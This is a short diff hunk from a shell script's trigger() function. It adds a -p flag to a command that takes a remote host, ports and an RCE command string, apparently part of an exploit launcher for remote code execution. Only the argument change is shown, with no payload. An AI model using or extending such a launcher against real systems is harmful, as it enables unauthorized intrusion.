@@ -59,7 +59,7 @@ trigger(){
       -lport $LPORT \
       -rhost $RHOST \
       -rport $RPORT \
-      -c "$RCE"
+      -c "$RCE" -p
 }
 
 # Check for permissions to host a local socket.
